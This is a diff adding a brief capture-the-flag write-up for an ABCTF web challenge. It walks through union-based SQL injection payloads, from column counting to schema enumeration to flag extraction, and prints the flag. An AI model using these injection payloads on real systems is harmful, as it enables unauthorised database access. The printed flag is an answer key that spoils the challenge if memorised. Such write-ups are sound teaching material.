@@ -1,0 +1,25 @@
+Problem:
+
+The union command could maybe be used to your advantage here!
+Link[http://yrmyzscnvh.abctf.xyz/web8/]
+
+----
+Writeup:
+
+- 1 OR 1 = 1 
+	- printed out everything
+- The input is likely escaped but not put in quotes
+- 1 OR 1 = 1 order by 5 
+	- did not work
+- 1 OR 1 = 1 order by 4
+	- did work
+- There are 4 columns in this table
+- 1 OR 1 = 1 UNION SELECT table_name, column_name, null, null FROM information_schema.columns
+	- printed out table names and column names
+- 1 OR 1 = 1 UNION SELECT f0und_m3, null, null, null FROM w0w_y0u_f0und_m3
+	- printed out the flag
+
+----
+Flag: abctf{uni0n_1s_4_gr34t_c0mm4nd}
+
+- 
